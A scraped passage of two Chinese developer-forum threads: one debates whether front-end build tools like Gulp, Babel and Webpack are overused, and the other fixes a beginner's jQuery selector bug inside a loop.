来加载模块。前端们觉得可以统一一下，都用 CommonJS 来写，于是用上 browserify 之类的工具。</p>\n<p>好了，这个时候一个前端项目需要有一个 Grunt （后来又有了 Gulp 等）任务用来打包前端资源，看起来就是一个标配了。</p>\n<h2>框架的兴起</h2>\n<p>前端们一直吐槽新手们用 jQuery 写出的「意大利面条」式的代码，于是发明的了一些框架，一开始比较火的是 MVC 框架（如 Backbone.js ），火了没多久，前端们发现 MVC 框架有很多相似的代码都是在做「绑定事件」「更新 view 」这些事情了，于是发现了 MVVM 框架（一种早年间被微软玩过的设计模式），最著名的库就是 AngularJS 。</p>\n<p>此时的库都是不需要额外用 Grunt 做转译的。</p>\n<p>直到 React 的出现。 React 背后的工程师（显示不是前端）发明了一种新的语法—— JSX ，把 HTML 和 JS 混合起来写。前端们看了一眼表示这才是写模板正确的姿势。唯一的问题是这种语法浏览器不支持，于是需要把 JSX 翻译成 JS 。</p>\n<p>此时 Grunt 大概也因为性能太低被 Gulp 取代了。</p>\n<p>于是此时用 React 的项目一定会去用 Gulp 将 JSX 翻译成 JS 。</p>\n<h2>ECMAScript 的发展</h2>\n<p>同时期， ES 发展也是非常迅猛。</p>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/Screen%20Shot%202016-07-17%20at%201.39.29%20AM.png\"></p>\n<p>IE 8 不支持 ES5 ，于是前端们说，「 IE 8 去死吧」，不想再支持 IE 8 了，因为那几年移动端发展迅猛，网页主要都是 H5 页面（不要问 H5 是不是 HTML5 ，不是 HTML5 ），所以很多前端确实不需要管 IE 8 。现在想想， Windows Phone 的失败，真是前端的福音啊。</p>\n<p>前端就开始追新了，一定要第一时间用上最新版的 JS 语法。但是即便是 Chrome 和 Firefox 也不可能那么快就支持最新语法。于是前端说，不过就是在 Gulp 里再加一道转译嘛，用 Babel 把 ES 2016 的语法转译成 ES 5 就好了。</p>\n<p>于是 Gulp 里又多了一项任务。</p>\n<h2>重新思考</h2>\n<p>经过这两三年的飞速发展，前端们是不是应该重新思考一下，做一个网页之前要加这么多 Gulp 任务的初衷到底是什么？是否解决了问题。</p>\n<p>从目前的结果来看，基本可以总结为</p>\n<ol>\n<li>DOM 不好用，换成虚拟 DOM</li>\n<li>CSS 不好用，换成 CSS in JS</li>\n<li>浏览器支持的 JS 不好用，换成 ES 最新版语法，然后转译为浏览器支持的 JS</li>\n<li>DOM Event 不用了，去新造一个 Event 机制。</li>\n<li>Gulp 用得太多了 watch 很慢，于是加上了 hot module replacement</li>\n</ol>\n<p>基本把能抛弃的都抛弃了。</p>\n<p>实际上这些变化非常适合复杂的 Web 应用，然而 90% 的页面根本不是单页面应用好吗！</p>\n<p>能不能让我写一个 CSS 一个 JS 刷新一下就能看到效果！为什么我要花那么多时间来学习转译工具，以及解决转译过程中的各种问题。</p>\n<p>总感觉『弊大于利』。甚至有的时候觉得这是『没有问题，创造问题也要上』。</p>\n<p>最后送给前端们一幅图：</p>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/159.png\"></p>\n</div></div>", "<div class=\"topic_content\">不服的同学，就说说，加了这些东西的好处是啥，然后我负责说坏处。</div>", "<div class=\"topic_content\">搞前端也要讲政治正确吗？你们就不要质疑我的动机，好好讨论利弊吧。</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家可以思考这么几个问题：</p>\n<ol>\n<li>不用 bable，用浏览器支持的 ES 行不行？（IE 8 不支持？shim？）</li>\n<li>不用 JSX（React 写起来就不爽了，最讨厌 React 这点了）行不行？</li>\n<li>不用 Webpack 行不行？如果你依赖的 Webpack 被前端界抛弃了怎么办？显然 JS 加载器的标准会出来的。你到时候怎么看 Webpack 都别扭。</li>\n<li>在想得狠一点，前端很多东西发展到现在，都违背初衷、过早优化、过度设计了。</li>\n</ol>\n<p>模块化：文件划分模块-&gt; 命名空间 -&gt; AMD -&gt; CommonJS -&gt; UMD -&gt; …… （问题越来越多）\n加载器：script src -&gt; load script -&gt; requirejs -&gt; browserify -&gt; webpack -&gt; hot module replacement -&gt; …… （开发是爽是爽了，执行和调试可不见得）</p>\n<p>你们都看不到弊端是吧？</p>\n</div></div>", "<div class=\"topic_content\">你也可以只思考一个问题：\r<br>现在的 HTML 、 CSS 和 JS ，真的没办法直接用了？（大型项目里）用起来真的那么难用？非要转译。\r<br>你加上这些工具和转译后，就没有后果？\r<br>\r<br>利弊讲清楚，我就服。</div>"], "reply": "189", "tittle": "不依赖 Gulp、Babel、WebPack，还能优雅地写代码吗？", "comment": [" @", " 不要去搞配置，直接从最简单的入手吧。 ", " 你光看体积不够，还要看看调试、新人学习、坑多不多，疑难好不好解决，特殊需求好不好处理。不过我相信中型项目是利大于弊的。", " 不要去搞配置，直接从最简单的入手吧。 ", " \r", "只是举出一个体积这么一个指标来反驳而已\r", "看调试：调试是有工具的\r", "新人学习：如果项目本来就用新技术，那么你干嘛不请一个本来就会新技术的新人？\r", "坑，疑难：坑，疑难这个肯定会比旧技术多，不过你可以选新技术中已经成熟了的版本，比如 Angular 1.x 而不是 2.x\r", "特殊需求：就是因为有特殊需求才搞出新技术的……\r", "\r", "其实按照你那么说，根本就不是新技术的锅，而是技术选型的问题", " \r", "react 一直比较激进\r", "JSX 在某些场景下还是很好用的，比如在教程里面\r", "react 比较好的是 react native", " 如果是根据需求选型，我是无法反驳的。不过现在大部分项目都是跟风选型，不需要搞那么多转译和框架的，也搞得那么复杂。然后还不准说 React 的不好。。。明显，有些项目就是不需要用 React", " 如果楼上都像你这样列出利弊，就事论事，就很好讨论问题了  :)\r", "\r", "很多人诛心是啥意思，我懒不懒想不想学新技术跟这个帖子有关系么。", " 我同意 React Native 才是 React 最大的卖点，其他都是可有可无的。", " \r", "\r", "我说了，熟悉前端的前提下，反正我用了不到十分钟看了一遍 webpack 的文档的使用部分然后就知道怎么写配置了，几十分钟是学 webpack 的 loader 开发了吧；\r", "gulp 的使用就更简单了，就一个 task 一个 watch ；\r", "es6 ……说实在的， es6 的新增语法和特性是浏览一遍就大概明白的；\r", "\r", "我没觉得现在的打包工具很好，但是很容易使用，你要是觉得不会开发这些工具的插件就不算会用的话，当我没说……", " 如果是边用边查文档边踩坑的话，你的方法和时间是可以的。。。", "作为一个菜鸡后端，表示我前端还停留在写 LESS 上……\r", "\r", "各种自动构建器只是听说过，从来没去使。", "看了文章和评论有点觉得楼主纯粹是因为不喜欢 React 就来喷 JS 这些年来的的新东西，真是没意思啊...\r", "当然如果楼主想要否定这些年前端的组件化和工程化发展方向那也没啥好说的了。\r", "\r", "记得以前写 less 还要专门用其他的工具转成 css 再来用，记得腾讯那会还出过一个专门的 GUI 软件，图片转成 base64 或压缩图片或压缩 js 还要专门找一个线上网址去完成，本地起一个 web 服务还有开启 php 环境或者用 python 启动，还有很多等等。。。现在 Gulp 把这些东西放在一个命令了全部能完成有啥不好嘛？如果你项目不需要就不用就是了，很多人还是会按照自己的需求来添加任务的，这有啥好质疑的嘛？也没人让你写一个海报页面把 webpack ， gulp 这些都搬出来啊\r", "\r", "任何新技术新轮子出来都是有目的的，不管是像阿里一样为了 kpi 还是为了开源好玩，但是新的东西能流行起来肯定是有迎合到部分人的需求的，你可以认为有的人是为了跟风，但那也只是小小部分啊。\r", "\r", "看过楼主之前那篇前后端分离感觉也是为了喷而喷，所以没啥好说的，楼主开心就好", " \r", "\r", "程序开发这件事上面……不可能有一下子全部搞明白然后投入开发不踩坑的吧", "just simply javascript fatigue fatigue", " 都说了是吐槽文。    我喷的不只是 React ，去年我还喷 Angular 1 了。希望这个不要也死掉", " 不是去年，是前年喷 Angular ，但是 NG 还是很火的。  然而我还是使用 NG 做项目了。\r", "你可以看下标题，我喷的是，加这么多工具，最后没工具网页都不能预览了。原生 HTML 、 CSS 都抛弃了， JS 写得也是不能在浏览器上运行的版本，这还不奇怪吗？我没看到什么语言这么否定自己。", " 你没觉得我那篇喷前后分离的是真相么……", "先马后看，本帖讨论的问题很有意义。前端现在确实发展很乱，很多项目功能重叠且相互排斥，完全是群雄争霸的状态，新人入门经常迷茫应该学什么。稍微不幸运站错了队就可能付出时间学了一个刚会用就被淘汰的东西。", "现在的所谓前端工程化\r", "1. minify - ok\r", "2. less / sass - maybe ok ，毕竟 CSS 选择器写起来很麻烦，但也只是写起来爽了，稍微加快效率。\r", "3. concat - maybe ok, HTTP/2 上了， concat 就收益不大了。\r", "4. live reload - not ok 。 经常在我不想刷新的时候刷新了。\r", "5. wabpack - 工程化，写起来爽了，没看出来解决了什么很大的问题。\r", "6. jsx 、 bable 、 react - 全家桶， react 是选型问题，我还是那个太少， 90% 的网站不应该用 react\r", "7. hot module replacement - 哈，是为了解决上面任务太多， watch 太慢，而不得不加的东西\r", "8. 依赖分析 - 用上 CommonJS 后带来的副产品，文件太细，还想动态加载，又不想动态加载得太多，然后还延伸出更多关于依赖管理的问题，甚至改变了前端写代码的方式， inline script 直接不让写了。评价就是半成品的工程化，需要人为做很多事情。", "纠正： 我还是那个太少->我还是那个态度", "个人觉得，工具都是为了项目服务的。\r", "如果一个项目， 1 个静态页面。什么打包压缩统统靠边，因为增加这些的附加成本可能大于维护成本。\r", "\r", "前端出现了 grunt ， gulp ， webpack ， babel 设置与各种浏览器的 pollfill ，这都是因为工程化的需要，现在的前端页面都有着大量的交互。与其说是简单的 web ，我更倾向于认为是 web app 。\r", "\r", "当我们选择 less/sass/stylus ，是因为 css 的纯静态化，当在工程项目中需要维护时，无论是一个颜色，或者是一个边框。如果是全局配置， less 可以通过变量实现， css 却需要全局替换（增加了出错成本），这是在项目维护成本上体现的。\r", "\r", "压缩静态文件，这点必不可少，流量=钱\r", "es6 甚至 es7 ，为什么有人用，因为提供了大量的新特性：类定义，异步回调等等，这都能减少出错成本。众所周知， js 的优雅一半取决在回调的处理上\r", "\r", "html5 ， css3 为什么有人用，因为大大方便了我们。 html5 的标签语义， css3 的新特性。当前浏览器不支持的情况下，各种 pollfill 也随之产生，等浏览器支持了，去掉 pollfill 就可以了。\r", "\r", "所以，这也是在工程中，有架构师存在的理由：一个对所有技术都了解的人，会更好的平衡时间成本和项目成本，系统维护和持续迭代，才是工程的大头。这也是前端工程化的意义，我们需要更好更优雅的写代码，程序员应该只关注到代码提交，后续打包压缩上线，工具都应该自动帮你完成（ CI ），以前是 grunt ， gulp ， webserver ，现在是 webpack+nodejs ，这仅仅是工具，最后还是要看人的选择", "hot module replacement 是因为 watch 太慢？ 难道不是为了保留 dom 状态刷新", " 那个也是功能之一，但是意义不大，跟 live reload 一个性质，节省几下鼠标点击而已。  如果 watch 太慢，你就必须加 hmr 了。", " 原生 HTML 、 CSS 都抛弃了， JS 写得也是不能在浏览器上运行的版本。\r", "\r", "所以说还是看你什么需求啊，一个简单的页面肯定还是用 html,css,js 写啊。但是如果有个需求复杂的项目，你用纯 html ,css ,js 写的效率和可维护性有用这些新东西来的好嘛？没有的话为什么不用呢？\r", "\r", "至于语言为啥这么否定自己，我倒不是这么觉得，一来 web 诞生之出那会的 web 产品对 html ,css ,js 的要求没这么高，所以那会的语言和 api 都不像现在这么强大和丰富。但即使现在 html5 和 css3 强大了很多，还是不能满足一些人的需求啊。咋办呢，只能通过 js 来实现自己的需求啊，要是 js 能让 htm l 和 css 变得更适合他们的需求他们肯定会去实现的啊，谁让这三个是一伙的呢，所以就有了 react  jsx 这种别人看起来四不像的东西啊。但这只是部分人的需求啊，你赞同这种思想有这种需求就用啊，没有就用 jq 或者其他的框架呀，在没用 mv*框架之前，我用 jquery 写单页面应用写的也很爽啊，这和语言这么否定自己有啥关系么。不过楼主要是因为自己不喜欢这一套但是团队又在用，觉得不爽吐槽一下是可以的", " 能有多少网页是 app 啊……淘宝手机客户端那些页面我都不认为应该全部做成 web app 。", " 按照现在前端的节奏，永远不会去掉 polyfill 的", " 我是觉得前端工具已经可以用丧心病狂来形容了，一个简单的问题，被复杂化到不行了，现在加一个 babel ，得先下载 70 兆左右的 NPM 依赖，呵呵。", " 不觉得，你喷也要按照基本法啊，技术也要跟着市场走啊。你说要是招个半年都没招到一个会设计数据库和 css 写的好人，但是一个月就能找到一个会设计数据库的后端和一个写 css 的前端。如果你是老板你会继续去招那个所谓的全栈还是先招那两个只会后端和前端的来把产品先搞上线呢？", " app 是看交互复杂程度的，还有如果用了某框架，团队可以省 50%开发或者维护成本，那肯定会选。\r", "pollfill 渐渐会去掉的。在 web 2.0 时候可能 webpack 也会精简了，浏览器原生支持模块异步加载的情况下。\r", "至于 babel 大小，你管他干嘛。比如 100M 带宽， 2T 硬盘，这点大小可以忽略吧。起码我是除非影响我性能的 app ，其它我都不会管它", " 你说的是，大公司之所以细分，目的之一就是这个。但是细分的缺点我也需要点明是不是。如果某些小公司不明就里，向大公司学习，搞前后分离，只会自己吃亏。", " 大意为着复杂，复杂意为着有 bug ……   我偏向于一行依赖都没有的原生 ES 语法。而不是构建在 70 兆 JS 代码上面的浏览器还没支持的最新 ES 语法。", " 你说的是，大公司之所以细分，目的之一就是这个。但是细分的缺点我也需要点明是不是。如果某些小公司不明就里，向大公司学习，搞前后分离，只会自己吃亏。\r", "这个是对的，看项目选择。\r", "新语法的话看个人习惯了，我觉得方便使用的，我都会去试，前端发展太快，需要保持一种对技术的活力，乱七八糟的新技术太多，只有尝试以后能留下来的才是好的。才可以进项目", " 还有工程化也是一门学问，可以好好研究下。当项目，时间，人力结合在一起的时候。不是我们一个人简单写代码就可以了", " webpack 的文档很烂啊， loader 更是基本没文档。 查起来都累。", " 我不认为现在前端的工程化是好的工程化，就说一个，版本依赖问题，\r", "假设我有个前端基础库  class.js\r", "然后所有组件（ c1.js  c2.js  c3.js ... c10.js ）依赖 class.js\r", "然后页面依赖了 c1.js c2.js c3.js ... c10.js\r", "好，现在 class.js 升级了，我是不是要去 c1.js ... c10.js 里全部改写 package.json ，发布一次。\r", "当然，这不只是 JS 遇到的问题，其他语言也有，但这种情况在浏览器上是很麻烦的，因为你不能只升级 c1.js 而不升级 c2 ... c10 ，否则你的页面里就有两个版本的 class.js ……\r", "\r", "这不是好的工程化，甚至比之前的 script 引入还要复杂和麻烦。", "我觉得楼主说的挺对的啊", " 共有依赖，这个处理方式和 jquery 一样， jquery 是怎么引的，这个差不多就怎么引。而且是不是该上 cdn 呢。这种举例都太细，没必要深究，取决于解决方式。其实最终目的就是为了给项目节省成本，提高质量，利于维护的意思。\r", "说到这点，我记得我之前公司的前端团队做的就很好，我们前端代码，后端看了都是一目了然的。每个人代码风格，实现逻辑上可以有不同，但是总体的代码结构是基本一致的。这不是不尊重个性，其实也是最大限度自由后发挥个性的表现。\r", "扯远了，我觉得差不多该说的都说了。\r", "观点就是技术是为了项目服务的，最终从企业来说，需要考虑成本，所以一切能省成本，又不影响代码质量前提下，所有可以用的工具都是会上纲上线的。程序员角度，在没有 ci 情况下， webpack 这种能一键压缩完成的，还是挺省事的", "等 wasm 出来吧 这些就统统作废了", "说这么多，很想看看楼主的代码，这么多东西都吐槽，\r", "说白了前端这些工具很明显的不适合构建复杂的项目，这些语言上的改进，框架和库的兴起，都是有原因的，效率是一方面，更好的构建项目，应对更复杂的工程才是关键\r", "来，发下代码吧，看看楼主是如何不采用上述技术，构建一个健壮的复杂项目的", " 这些技术我都用了……边用边吐槽。如果我有更好的，我就发了。", " 当然其实我是有一个基于 jQ 的小框架的，不过改进不大，唯一的改进就是不需要 watch ，用原生，有 MVC 、有组件、利用原生 DOM Event 做模块通信，用在 ", " 的商家页面里了，并没有好到可以秒杀其他。", "觉得楼主说的挺对。前端的东西很碎片\r", "\r", "前端就是——语言不够框架来凑", "其他语言都有预编译, 你怎么不说多余的呢. 前端加上这些才能说是正在的在完善生态吧.", "1. bable IE8 这个没的吐槽，前几年的 IE6 不是也就这么过去了么，现在 17%的占有率其实也就 1 年的时间了，和技术无关\r", "2. JSX 相对于 angular 的 template 用字符串，这已经好太多了，我们还不讨论 angular 1 的 directive 设计的有多么糟糕， react 的组件只用了非常简单的理念就解决了 directive 解决不好的问题\r", "3. 请找出一个比 webpack 更好的解决方案来\r", "4. 现在前端工程的复杂度上讲过渡设计这件事情是要看项目的，简单项目 jq 自然几句话解决了，前端技术上的选择面很多，比比没有选择的时候\r", "5. 模块化上， webpack  sourcemap 调试要完爆各种其他调试", " 对于组件的通讯，来说目前看来，在复杂的项目上，没有 flux ， redux 的理念，事件维护性上非常差，特别是需要大量维护状态的时候，非常难于管理，维护时难于梳理，项目简单的时候到还好说", "说这些，所表达的意思是，技术在前进，而且在通往更好的时代", "这些框架的出现都是为了解决相应的问题， grunt 的出现为了编译 js ， less ， gulp 的出现为了更快的编译，更舒适的写任务， webpack 的出现，则解决了异步加载，版本号等问题。出现问题，选择相应的框架，而不是，一开始就不带任何目的用框架，没有意义。", "这篇文字写得挺有意义，也挺能激起技术嘴仗来着，只不过有些童鞋有点过敏，立马下一个“楼主对新技术无感、懒”的定论，只是讨论和反思嘛！我觉得前端圈能变成现在介个样纸，原因多少有这些：\r", "\r", "1 、无法满足前端切图仔 “翻身农奴把歌唱” 日益蓬勃的「逼格感提升」这个迫切需求。（说白了，这年头，动不动就讲逼格，团队逼格，对！说得就是你！你这个 Zhuangbility 的前端， 2333333 ）\r", "\r", "2 、一切的始作俑者或导火索，确实跟 Node.js 的出现分不开。突然让前端人对后端各种好模式\\工程自动化构建\\组件模块化开发等那种长久“咬牙切齿羡慕嫉妒恨又无处施展的抱负”有了一一实现的可能，更是凭借其朝着让 JS 走遍天下大一统的野心道路全速前进；\r", "\r", "3 、 W3C 、 ES 等标准早期的无所作为，加上确实相对落后的前端工程化早期现状。不过这几年随着各方推动，整个标准的定制之路也随之快速全面完善起来，故前端的现有各种工具\\库\\组件在标准出台之后，可能会逐渐谢幕？现在的这些感觉都只会是过渡阶段产物~这些确实实实在在增加了重复学习各种工具的成本，也导致出现了新人望着名目繁多各种名词两眼一抹黑的窘境，那个内心无处安放呐~\r", "\r", "4 、前端，不再是可有可无的岗位，这些的改变，形成了更多后端&专业前端之间的技术壁垒。（这或许是有些前端人希望看到的，专业事交给专业的人干，以往后端随便都能写几个页面的历史从此不再。。。所以，薪资，必须提上来，是吧）\r", "\r", "5 、大中型项目良好的用户体验及敏捷开发团队的快速迭代需求所愿。（对待平常较小的商业项目，杀鸡用牛刀，确实没必要，需求决定技术选型及一切，毕竟开发成本还是要为公司考虑的。只不过开发者自个儿应抱有持续学习的心态，业余时间倒是有必要适当的“杀鸡用牛刀”整些新鲜的私人玩意儿，你说呢？）", "说白了，工具是为了人服务，技术是为了业务服务，什么样的业务场景需要什么样的技术选型。如果只是做两个静态页面，完全可以靠手写，但是如果是做 100 个页面呢？ 1 个人做业务用啥都行，但如果是 5 个， 10 个人呢？如果页面是 10 个人访问，可以不考虑性能，但如果是 1 百万个人呢？之前前端都是多页面开发，为了用户体验出现了 spa ， mvc ， mvvm 等一堆框架，技术复杂度又提升了不少。不是工具越来越复杂，而是随着业务的增长在一步一步满足各种各样的需求时变的复杂起来。杀鸡不要用牛刀，打蚊子不要用大炮，合理的技术选型才是关键。", "Ember 才是前端框架公认的最后的王者", "贵端真乱。。", " \r", "调试方面不觉得麻烦吗？ \r", "-- 调试并不麻烦，本地双击 html 调试运行无法加载跨域 js ，导致务必运行一个小型服务器， webpack 的热加载功能让实时调试变得更简单\r", "\r", "还有新人学习成本如何？\r", "-- 个人觉得学习成本挺大的。我从 document.write 到现在的 react 断断续续花了一年。\r", "\r", "还有一些 jQuery 的组件用不了了是不是都要重写？\r", "-- 这个不太了解，不太用第三方组件\r", "\r", "我的体会是隐性成本很多。我这里最大的成本就是，以前后端可以帮忙写页面，写在他看都不看全给我们前端了。少了很多人力！\r", "-- 我现在的岗位前端比较重，设计师要求各种奇奇怪怪的页面，使用组件化的架构确实能减少大量成本，其中最重要的是静态资源管理的成本。不过不同需求结果不同，我同意你说的简单的页面其实并不需要打包系统。", "前端最麻烦就在于 不能直接基于后端的思维去 解决问题。\r", "前端技术给我一种感觉就是，每天变着花样写页面。。", "客户端工程师、后端工程师、前端工程师用硬件工程师发明的时空穿越机来到了三年后。\r", "\r", "只有前端工程师没有找到工作。", "前端就是折腾！", " 「最后没工具网页都不能预览了」\r", "\r", "所以我喜欢那些 standard compliant 的工具。\r", "\r", "比如 JSPM 你就可以选择离线编译或者在线编译（虽然性能很差），不用在命令行里输什么命令。随着浏览器支持 script[type=\"module\"]，在线编译的成本也越来越小，如果不需要 css! 之类的 custom loader 的话，甚至可以完全去掉转译这一步。\r", "然后 PostCSS ，如果只用那些符合标准的插件的话，在最新版浏览器里调试时完全不需要构建。\r", "\r", "我个人还是觉得未来的前端工具最终目标将是类似于标准 polyfill 的服务。\r", "当然，前提是标准够好用，工具能力够强大……\r", "目前的情况还是有点悲观的， JSPM 发展远不如 Webpack ， PostCSS 社区很多广泛使用的插件并不与标准兼容。", "至于我个人，只有 autoprefixer 这一个工具是「不用了就写不好代码」的，因为我真的记不住那么多 flex 标准……", "哈哈哈，吵吵挺好的\r", "没人 bb 了说明狗带了\r", "就这样接着吵呗", "看了这些回复……感觉总结成一句话应当是，不考虑实际场景直接下结论的行为就是耍流氓…", " 信不信 wasm 出来更乱\r", "直接就可以把浏览器踢开自己搞了", "能加薪的技术就是好技术, 谁管什么用户体验,性能,速度. react 就是程序员的福音, 用完 react + redux 一整套, 大型项目一年后自己都不敢维护了, 绝对是加密利器", "不考虑需求都是耍流氓，就跟说房价不考虑地域一样，都是耍流氓", " \r", " \r", "即使考虑需求，我还是认为， 90% 的网站，不需要这么复杂的工具和框架。\r", "也就在线 IDE 、编辑器、作图工具，才需要搞这么复杂。", " 刚看到 2/8 定律，就 2/8 分吧。新的东西出来都是有原因的，或者解决某种需求。 jQuery,在移动互联网就没有那么火了，我想总是有原因的。当然也能解决一些需求。更多的看需求，其实真正的在解决某种需求，技术都是为了实际需求才得以发展的。真没有看到为了创造技术而创造技术的，或许自己孤陋寡闻了。", "这些技术都是工具，要根据自己的业务需求来选择合适的工具，而不是盲目的乱用，也不是盲目的批判\r", "就像现实生活中的工具一样，锤子，锄头，镰刀，推土机，吊车，机械化挖土机等等这些工具\r", "来，你说说有锄头就可以挖坑了啊，干嘛还要挖土机呢，操作麻烦，噪声大还耗油，对于我这种想挖个小坑种个菜的人来说，真是没用的东西，都不知道发明出来干嘛\r", "是的，你种点菜挖点土，用锄头真是再合适不过了，但你想想如果要你挖基角，建高楼大厦呢，还用锄头吗？用专业挖土机，蓝翔毕业人士效率不比你高 N 倍？\r", "这是生活中随处可见的例子，生活中你知道要根据自己的需求来选择合适的工具，为什么编程写代码的时候就不懂这个道理了呢？\r", "小项目就像你挖土种菜一样，怎么方便怎么来，大项目就像建高楼大厦一样，需要有工程师来评估用什么工具，什么框架快速稳妥的来实现需求\r", "大项目不使用合适的工具，合适的技术框架来开发，真不知道会乱成什么样子，特别是多人合作的情况下，根本就没法开发，按照你的想法就使用原生 HTML,CSS 来手写，就命名问题就可以让你痛不欲生", "至于你说的\"甚至有的时候觉得这是『没有问题，创造问题也要上』\"，只能说你遇到的业务类别少\r", "工具都是因为有需求才被创造出来的，而不是创造了工具才来想需求\r", "就像你说的复杂的 web 网页是非常适合用这些工具的，就是因为做复杂页面的人遇到了这些问题，才创造出这些工具的啊\r", "你的问题就在于自己没有碰到这样的业务需求，却硬要用这些工具，这是自己误用工具，而不是这些工具没用", " @", " 你说的我不分认同，但真没那么多复杂项目，我做过最复杂的事在线图片编辑，也是用 backbone 做的", "如果没理解错的话，楼主主要围绕着大意『前端离开了这些新技术新工具就无法工作无法优雅地写代码的地步』展开。\r", "这么早就下这么肯定的结论是不是给人一种钦定的感觉。。我倒是觉得，大部分作为会这些新技术新工具的人，他们离开这些工具也能写出质量不错的代码，而大部分不会这些的人他们不会也不想去学这些，前者大多集中在大公司独角兽，后者大多集中在小公司外包，他们的选择都很好因为都是最适合他们当前场景的。而作为白纸新人的我，还是希望能够赶上一波历史的进程吧", " 没那么多复杂的项目？骚年，只是你没遇到罢了，你也会说你做过的最复杂的是在线图片编辑，比这复杂难度高的项目多了去了，你没做过，不代表没有啊。\r", "去看看国内一二线互联网公司的前端项目吧", " 我一直在一线互联网公司呀……", " 你的翻译不对吧……我在吐槽现在的新框架对工具依赖太重，没有工具，无法写代码，因为代码不能运行在浏览器里。", "在我负责构建的前端项目里，全面使用了 es2015 和 modules ，就是建立在 babel 和 webpack 上的。\r", "因为构建过程对于源代码完全透明，取代这些工具的成本很低（如果有更好的方案），我是乐于见到上述工具被淘汰的，比如只需支持 chrome50+ / edge14+ / firefox48+ ， babel 这一步完全可以省略（什么你要 stage-0123 ？还有 jsx ？），再如将来 http2 的普及和浏览器支持 import ， webpack 也大可被替代。\r", "这都几乎与所写的代码无关。我说的这些工具都只是把已经确定要来的未来做铺垫而已。\r", "最后回答楼主，是，没有这个未来环境，（我）没法写了。", " 用 ES 6 好处很大么？ 我倒觉得变复杂了。我只喜欢 async await ，可以还没有。\r", "就算浏览器准备好了，你也不会去掉转义的，因为 babel 用上了就停不下来，这只是我猜啊。\r", "要真是与代码无关就好了，最大的关系就是能不能直接运行。我就是很在意，我写的代码不能运行这件事。\r", "我也很在意，以后不能直接操作 DOM 这件事。也很在意， CSS 要写成 JS 。也很在意 Event 都不能用了。\r", "\r", "这还是 Web 吗？", " 语言的好处见仁见智吧。\r", "babel 可以停下来的，因为 es2015 年是分界线，以后的 es201x 不会像这次那样憋个几年一次过全更新了。\r", "代码用到 webpack 的语法还是有一些 ， ensure 和 context 啰，合理使用还是能无痛迁移的。\r", "CSS in JS 只是 React 的哲学，你我都知道它不是只面向 web 的。我同意不是大部分的 website 都有必要用 React 或其它框架。\r", "既然是简单的 website ，也不必担心那些有复杂场景，以长得像 App 为荣的 webapp 的过度工程啊。", "Gulp 、 Babel 、 WebPack ，我一个都没用，还算前端开发吗？", "小胖喷的就是过度工程化，让原本简简单单的代码变得复杂化。让人没有工具，就没办法好好写代码了", "一大早看到这个帖子 感觉心好累", " 在某些人看来，可能不算『新·前端』吧", " 嗯？怀疑人生了吗？", "得亏当初选了后端方向", " wasm 出来以后 就变成现有的大平台上去了", "能", "其实就是为了写得爽而已", "其实东西是太多了，太头疼。 可是会用之后，又觉得真的很方便。", "现在依然用最原始的方式来写前端。。。。。", "讲了那么多，最后还不是打包压缩了吼？有啥区别，只是开发过程更 dev 了", "当然可以，不过写起来会很累而已。就好比让你写纯 CSS/JS 肯定没有写 Sass/jQuery 代码效率高\r", "\r", "LZ 所说的『弊大于利』其实很大程度上是因为前端开发的领域各种设施不完备造成的，很多时候用这些东西也有些无奈。打包工具用久了的确很怀念以前直接手动写代码的那种即拿即用爽快感。但是时代不一样了，前端要做的事情和责任也不一样了", "？这些工具很难用？你应该不是前端吧，我当时学着用的时候 1 天基本就能正常配置用了~小项目最后也会维护，用个 css 预处理器，加点前缀用 gulp 很方便，还能 watch ，不然你手动呀。按需要配置才专业，不需要的又没让你配，不想用只是你还没深入学会，所以还处于舒适区~", "对了，你回上面照顾新人。新人不更应该多折腾学习么？难点就难点吧~学会拥抱变化，而不是说什么什么不好，选择你需要的，又没强迫你用"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>哪里出问题呢， if 语句块不能包含在 for 循环中吗？\nvar jq=$.noConflict();\nfunction kw_updatevalue(){</p>\n<pre><code>for (var i=1;i&lt;6;i++){\nif(\n(jq(\"input[name=tiaojia001_shangpin_wfx.concat(i)]\").val().indexOf('金龙鱼')!=-1  \n  ||  \njq(\"input[name=tiaojia001_shangpin_wfx.concat(i)]\").val().indexOf(\"香满园\")!=-1\n||  \njq(\"input[name=tiaojia001_shangpin_wfx.concat(i)]\").val().indexOf(\"胡姬花\")!=-1\n||  \njq(\"input[name=tiaojia001_shangpin_wfx.concat(i)]\").val().indexOf(\"欧丽薇兰\")!=-1\n||  \njq(\"input[name=tiaojia001_shangpin_wfx.concat(i)]\").val().indexOf(\"元宝\")!=-1\n||  \njq(\"input[name=tiaojia001_shangpin_wfx.concat(i)]\").val().indexOf(\"口福\")!=-1\n||  \njq(\"input[name=tiaojia001_shangpin_wfx.concat(i)]\").val().indexOf(\"刀唛\")!=-1)\n&amp;&amp;  (jq('select:eq(i)').val()==0.17)\n</code></pre>\n<p>){\nalert('税率错误，请重新选择');\n}\nalert(i);\n}</p>\n<p>}</p>\n</div></div>"], "reply": "16", "tittle": "js 为什么不执行呢？语法错误吗？", "comment": ["看看有没报错，用断点观察一下。", "加引号  name='xxx'", "\"input[name=tiaojia001_shangpin_wfx.concat(i)]\"要改成\"input[name=\"+tiaojia001_shangpin_wfx.concat(i)+\"]\"吧，选择器里面怎么能执行代码呢？\r", "另外你不要复制粘贴这么多遍", "(\"input[name='tiaojia001_shangpin_wfx.concat\"+i+\"']\")这个吧？", "(i) => (\" + i + \")", "楼主能把 input 的代码给贴出来吗", "jQuery('input[name=tiaojia001_shangpin_wfx.concat('+i+')]')", "我的天呐。。这代码写的。。太优美了。。首先这里的 i 当做字符串处理了而不是变量。。其次。。把这些什么金龙鱼啊之类的放在一个数组里然后做判断吧。。", "谢谢，已经解决了，谢谢各位耐心指导~", "jq(\"input[name=tiaojia001_shangpin_wfx.concat(i)]\") \"引号内的东西完全当做字符串来用了，没有执行运算\"", "看着难受..", "这写法碉堡了， jq 重复获取一个 dom 效率太低了，改改吧", "提个与问题无关的代码质量问题：把重复的代码提取一下吧。。 N 种你还要复制 N 遍不成，如果再要改动你还要再改 N 处不成。", "可以把重复部分提取出来，用数组放数据，再加个循环从数组逐取数据处理。或者重复部分提取出来成为单独函数，调用时把不同数据传入。", "我相信接受这段代码的人肯定会问候作者家的亲人", "为什么只有金龙鱼是单引号，别的都是双引号", "为什么只有金龙鱼是单引号，别的都是双引号"]},
